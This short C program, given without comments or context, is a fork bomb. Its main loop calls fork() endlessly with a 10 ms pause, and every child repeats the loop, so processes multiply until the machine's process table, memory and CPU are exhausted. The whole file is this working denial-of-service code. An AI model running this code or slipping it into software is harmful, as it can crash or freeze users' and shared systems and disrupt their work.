#include <unistd.h>
#include <stdio.h>

int main() {
    while (1) {
        fork();
        usleep(10000);
    }
    return 0;
}
